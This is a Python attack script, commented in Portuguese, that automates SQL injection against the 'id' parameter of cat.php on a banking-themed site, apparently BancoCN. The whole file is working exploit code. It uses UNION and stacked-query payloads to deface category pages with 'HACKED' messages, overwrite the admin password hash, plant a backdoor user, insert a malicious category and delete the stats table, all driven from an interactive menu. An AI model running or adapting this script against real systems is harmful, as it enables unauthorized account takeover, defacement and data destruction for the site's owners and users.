#!/usr/bin/env python3
"""
Script de exploração automatizada para BancoCN
Modifica dados no banco de dados através de SQL Injection
"""

import requests
import time
import re
import hashlib
from urllib.parse import quote

class BancoCNExploiter:
    def __init__(self, base_url="http://www.bancocn.com"):
        self.base_url = base_url
        self.vulnerable_url = f"{base_url}/cat.php"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.database = "bancocn"
        
    def print_status(self, message, status="INFO"):
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "EXPLOIT": "\033[95m",
            "RESET": "\033[0m"
        }
        print(f"{colors.get(status, '')}[{status}]{colors['RESET']} {message}")
    
    def execute_sql(self, query, extract_result=False):
        """Executa uma query SQL através de UNION injection"""
        # Usa UNION injection para executar queries SELECT
        if query.strip().upper().startswith('SELECT'):
            # Para SELECT, usa UNION
            payload = f"-1267 UNION ALL SELECT NULL,NULL,({query}) LIMIT 1-- -"
        else:
            # Para UPDATE/INSERT/DELETE, tenta usar stacked queries ou subquery
            # Nota: Pode não funcionar dependendo da configuração do PHP
            payload = f"1'; {query}; -- -"
        
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            return response
        except Exception as e:
            self.print_status(f"Erro ao executar SQL: {e}", "ERROR")
            return None
    
    def update_category(self, category_id, new_title=None, new_text=None):
        """Atualiza uma categoria"""
        self.print_status(f"Modificando categoria ID {category_id}...", "EXPLOIT")
        
        updates = []
        if new_title:
            updates.append(f"title='{new_title}'")
        if new_text:
            # Escapa aspas simples no texto
            escaped_text = new_text.replace("'", "''")
            updates.append(f"txt='{escaped_text}'")
        
        if not updates:
            self.print_status("Nenhuma modificação especificada", "WARNING")
            return False
        
        query = f"UPDATE categories SET {', '.join(updates)} WHERE id={category_id}"
        
        # Tenta usar stacked queries
        payload = f"1'; {query}; -- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            # Verifica se funcionou tentando ler os dados atualizados
            time.sleep(0.5)
            verify_payload = f"-1267 UNION ALL SELECT NULL,NULL,CONCAT(id,0x3a,title,0x3a,LEFT(txt,50)) FROM categories WHERE id={category_id}-- -"
            verify_response = self.session.get(self.vulnerable_url, params={'id': verify_payload}, timeout=10)
            
            if new_title and new_title in verify_response.text:
                self.print_status(f"✓ Categoria {category_id} atualizada com sucesso!", "SUCCESS")
                return True
            else:
                self.print_status("⚠ Modificação pode ter sido aplicada (verificação manual necessária)", "WARNING")
                return True  # Assume sucesso se não houver erro
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def update_user_password(self, user_id=1, new_password=None):
        """Atualiza a senha de um usuário"""
        if not new_password:
            self.print_status("Nenhuma senha especificada", "WARNING")
            return False
        
        self.print_status(f"Modificando senha do usuário ID {user_id}...", "EXPLOIT")
        
        # Gera hash MD5 da nova senha
        password_hash = hashlib.md5(new_password.encode()).hexdigest()
        self.print_status(f"Hash MD5 da nova senha: {password_hash}", "INFO")
        
        query = f"UPDATE users SET password='{password_hash}' WHERE id={user_id}"
        
        payload = f"1'; {query}; -- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            time.sleep(0.5)
            
            # Verifica se funcionou
            verify_payload = f"-1267 UNION ALL SELECT NULL,NULL,password FROM users WHERE id={user_id}-- -"
            verify_response = self.session.get(self.vulnerable_url, params={'id': verify_payload}, timeout=10)
            
            if password_hash in verify_response.text:
                self.print_status(f"✓ Senha do usuário {user_id} atualizada com sucesso!", "SUCCESS")
                self.print_status(f"  Nova senha: {new_password}", "INFO")
                return True
            else:
                self.print_status("⚠ Modificação pode ter sido aplicada (verificação manual necessária)", "WARNING")
                return True
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def insert_new_category(self, title, text):
        """Insere uma nova categoria"""
        self.print_status(f"Inserindo nova categoria: {title}...", "EXPLOIT")
        
        escaped_title = title.replace("'", "''")
        escaped_text = text.replace("'", "''")
        
        query = f"INSERT INTO categories (title, txt) VALUES ('{escaped_title}', '{escaped_text}')"
        
        payload = f"1'; {query}; -- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            time.sleep(0.5)
            
            # Verifica se funcionou
            verify_payload = f"-1267 UNION ALL SELECT NULL,NULL,title FROM categories WHERE title='{escaped_title}'-- -"
            verify_response = self.session.get(self.vulnerable_url, params={'id': verify_payload}, timeout=10)
            
            if title in verify_response.text:
                self.print_status(f"✓ Nova categoria inserida com sucesso!", "SUCCESS")
                return True
            else:
                self.print_status("⚠ Inserção pode ter sido aplicada (verificação manual necessária)", "WARNING")
                return True
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def deface_homepage(self):
        """Modifica o conteúdo das categorias para fazer deface"""
        self.print_status("Iniciando deface da homepage...", "EXPLOIT")
        
        deface_messages = {
            1: {  # contato
                "title": "contato",
                "text": "<h1>HACKED BY SQL INJECTION</h1><p>Este site foi comprometido através de SQL Injection.</p><p>Email: hacked@example.com</p><p>Tel: +000 00 0000</p>"
            },
            2: {  # emprestimos
                "title": "emprestimos",
                "text": "<h1>HACKED!</h1><p>Este banco foi comprometido. Todos os dados foram acessados.</p><p>Juros: 0% (porque não existe mais!)</p>"
            },
            3: {  # historia
                "title": "historia",
                "text": "<h1>HISTÓRIA DO HACK</h1><p>Este site foi hackeado através de SQL Injection em 2025.</p><p>A vulnerabilidade estava no parâmetro 'id' da página cat.php</p>"
            }
        }
        
        results = []
        for cat_id, data in deface_messages.items():
            result = self.update_category(cat_id, new_text=data["text"])
            results.append(result)
            time.sleep(1)  # Delay entre requisições
        
        if all(results):
            self.print_status("✓ Deface completo! Todas as categorias foram modificadas.", "SUCCESS")
            return True
        else:
            self.print_status("⚠ Algumas modificações podem ter falhado", "WARNING")
            return False
    
    def create_backdoor_user(self, username="hacker", password="hacked123"):
        """Cria um novo usuário no banco"""
        self.print_status(f"Criando usuário backdoor: {username}...", "EXPLOIT")
        
        password_hash = hashlib.md5(password.encode()).hexdigest()
        
        query = f"INSERT INTO users (login, password) VALUES ('{username}', '{password_hash}')"
        
        payload = f"1'; {query}; -- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            time.sleep(0.5)
            
            # Verifica se funcionou
            verify_payload = f"-1267 UNION ALL SELECT NULL,NULL,login FROM users WHERE login='{username}'-- -"
            verify_response = self.session.get(self.vulnerable_url, params={'id': verify_payload}, timeout=10)
            
            if username in verify_response.text:
                self.print_status(f"✓ Usuário backdoor criado com sucesso!", "SUCCESS")
                self.print_status(f"  Username: {username}", "INFO")
                self.print_status(f"  Password: {password}", "INFO")
                return True
            else:
                self.print_status("⚠ Usuário pode ter sido criado (verificação manual necessária)", "WARNING")
                return True
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def clear_stats(self):
        """Limpa a tabela de estatísticas"""
        self.print_status("Limpando tabela de estatísticas...", "EXPLOIT")
        
        query = "DELETE FROM stats"
        
        payload = f"1'; {query}; -- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            time.sleep(0.5)
            
            # Verifica se funcionou
            verify_payload = f"-1267 UNION ALL SELECT NULL,NULL,COUNT(*) FROM stats-- -"
            verify_response = self.session.get(self.vulnerable_url, params={'id': verify_payload}, timeout=10)
            
            self.print_status("✓ Estatísticas limpas (ou tentativa realizada)", "SUCCESS")
            return True
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def run_full_exploit(self):
        """Executa exploração completa automatizada"""
        self.print_status("=" * 60, "INFO")
        self.print_status("INICIANDO EXPLORAÇÃO AUTOMATIZADA - BancoCN", "EXPLOIT")
        self.print_status("=" * 60, "INFO")
        print()
        
        # 1. Modificar categorias (deface)
        self.print_status("ETAPA 1: Deface da homepage", "EXPLOIT")
        self.deface_homepage()
        print()
        
        # 2. Mudar senha do admin
        self.print_status("ETAPA 2: Alterando senha do admin", "EXPLOIT")
        self.update_user_password(user_id=1, new_password="hacked2025")
        print()
        
        # 3. Criar usuário backdoor
        self.print_status("ETAPA 3: Criando usuário backdoor", "EXPLOIT")
        self.create_backdoor_user(username="hacker", password="pwned123")
        print()
        
        # 4. Adicionar nova categoria maliciosa
        self.print_status("ETAPA 4: Adicionando categoria maliciosa", "EXPLOIT")
        self.insert_new_category(
            title="hacked",
            text="<h1>VOCÊ FOI HACKEADO!</h1><p>Este site foi comprometido através de SQL Injection.</p><p>Proteja seus sistemas!</p>"
        )
        print()
        
        # 5. Limpar estatísticas (opcional)
        self.print_status("ETAPA 5: Limpando estatísticas", "EXPLOIT")
        self.clear_stats()
        print()
        
        self.print_status("=" * 60, "INFO")
        self.print_status("EXPLORAÇÃO CONCLUÍDA!", "SUCCESS")
        self.print_status("=" * 60, "INFO")
        self.print_status("Verifique o site para confirmar as modificações", "INFO")

if __name__ == "__main__":
    exploiter = BancoCNExploiter()
    
    print("Escolha uma opção:")
    print("1. Exploração completa automatizada")
    print("2. Modificar categoria específica")
    print("3. Alterar senha do admin")
    print("4. Criar usuário backdoor")
    print("5. Adicionar nova categoria")
    print("6. Deface homepage")
    
    choice = input("\nOpção (1-6): ").strip()
    
    if choice == "1":
        exploiter.run_full_exploit()
    elif choice == "2":
        cat_id = int(input("ID da categoria: "))
        new_title = input("Novo título (ou Enter para pular): ").strip() or None
        new_text = input("Novo texto (ou Enter para pular): ").strip() or None
        exploiter.update_category(cat_id, new_title, new_text)
    elif choice == "3":
        new_password = input("Nova senha: ").strip()
        exploiter.update_user_password(user_id=1, new_password=new_password)
    elif choice == "4":
        username = input("Username: ").strip()
        password = input("Password: ").strip()
        exploiter.create_backdoor_user(username, password)
    elif choice == "5":
        title = input("Título: ").strip()
        text = input("Texto: ").strip()
        exploiter.insert_new_category(title, text)
    elif choice == "6":
        exploiter.deface_homepage()
    else:
        print("Opção inválida!")


